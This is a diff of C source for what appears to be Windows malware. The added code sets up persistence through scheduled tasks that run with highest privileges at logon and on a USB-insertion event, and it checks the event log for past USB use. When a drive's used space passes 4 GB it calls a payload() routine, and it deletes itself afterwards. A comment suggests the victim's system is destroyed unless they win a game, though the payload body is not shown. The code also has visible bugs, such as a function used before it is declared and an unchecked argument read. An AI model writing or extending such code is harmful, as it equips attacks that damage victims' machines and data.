@@ -1,12 +1,13 @@
 #include <windows.h>
-#include <tlhelp32.h>
 #include <stdio.h>
 #include <time.h>
 #include <stdlib.h>
 #include <winioctl.h> 
 #include <ntdddisk.h>
 #include <stdbool.h>
-#include <dbt.h>
+#include <winevt.h>
+
+#pragma comment(lib, "wevtapi.lib")
 
 
 // note*
@@ -65,7 +66,30 @@ void task_sch_logon() {
     system(cmd);
     
 }
-void task_sch_usb() {
+
+BOOL past_usb_check(){
+    EVT_HANDLE hQuery = EvtQuery(
+        NULL,
+        L"Microsoft-Windows-DriverFrameworks-UserMode/Operational",
+        L"*[System[(EventID=2003)]]",
+        EvtQueryReverseDirection
+    );
+
+    if (!hQuery) return FALSE;
+
+    EVT_HANDLE hEvent;
+    DWORD returned;
+    BOOL found = FALSE;
+
+    if (EvtNext(hQuery, 1, &hEvent, 0, 0, &returned)) {
+        found = TRUE; 
+        EvtClose(hEvent);
+    }
+
+    EvtClose(hQuery);
+    return found;
+}
+
 ULONGLONG used_space_drive(const wchar_t* drive) {
     ULARGE_INTEGER free_bytes, total_bytes, total_free;
     if (GetDiskFreeSpaceExW(drive, &free_bytes, &total_bytes, &total_free)) {
@@ -74,22 +98,41 @@ ULONGLONG used_space_drive(const wchar_t* drive) {
     return 0;
 }
 
+DWORD drive_mask; //global
+ULONGLONG threshold = 4ULL * 1024 * 1024 * 1024;
+
+void check_new_usb() {
+    drive_mask = GetLogicalDrives(); // gets bitmask of all drives
+    check_usb_threshold(threshold);
+}
+
+void task_sch_usb() {
+    if (!past_usb_check()) {
+        return;
+    }
+    char exepath[MAX_PATH];
+    char cmd[MAX_PATH + 512];
+    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) return;
+
+    sprintf(cmd,
+        "schtasks /create /tn \"%s\" /tr \"%s usb_check\" /sc ONEVENT "
+        "/ec System /mo \"*[System[Provider[@Name='Kernel-PnP'] and EventID=200]]\" "
+        "/rl highest /f",
+        rand_nm, exepath);
+    system(cmd);
+    
+}
+void check_usb_threshold(ULONGLONG threshold) {
     for (int b = 0; b < 26; b++) {
-        if (drive_mask & (1 << b)) {
-            wchar_t drive[4] = {L'A' + b, L':', L'\\', L'\0'};
-            ULONGLONG used = used_space_drive(drive);
-
-        if (used >= threshold) {
-            sprintf(cmd,
-                "schtasks /create /tn \"%s\" /tr \"%s usbcheck\" /sc ONEVENT /ec System /mo \"*[System[Provider[@Name='Kernel-PnP'] and EventID=200]]\" /rl highest /f",
-                rand_nm, exepath);
-
+            if (drive_mask & (1 << b)) {
+                wchar_t drive[4] = {L'A' + b, L':', L'\\', L'\0'};
+                ULONGLONG used = used_space_drive(drive);
+            if (used >= threshold) {
+                payload();
+                break;
             }
         }
     }
-}
-void task_sch_usb() { 
-
 }
 // so if you win your system isnt destroyed
 void safe() {
@@ -100,12 +143,12 @@ void safe() {
     
     //delete itself
     //uses localhost as a delay method 
+    char cmd[MAX_PATH + 64];
     GetModuleFileNameA(NULL, cmd, MAX_PATH);
     char rm_cmd[MAX_PATH + 128];
-    char exe_path[MAX_PATH];
-    sprintf(rm_cmd,
-        "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", exe_path);
+    sprintf(rm_cmd, "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
     system(rm_cmd);
+
 }
 void game() {
     SetConsoleTitleA("Screen");
@@ -238,12 +281,14 @@ int main(int argc, char *argv[]){
     if (argc > 1 && strcmp(argv[1], "payload") == 0) {
         payload();
         return 0;
-    } else if (strcmp(argc[1], "usb_check") == 0) {
-        task_sch_usb();
+    } else if (strcmp(argv[1], "usb_check") == 0) {
+        check_new_usb();
+        return 0;
     }
     admin_check();
     srand(time(NULL));
     gen_rnd();
-    task_sch();
+    task_sch_logon();
+    task_sch_usb();
     game();
 }
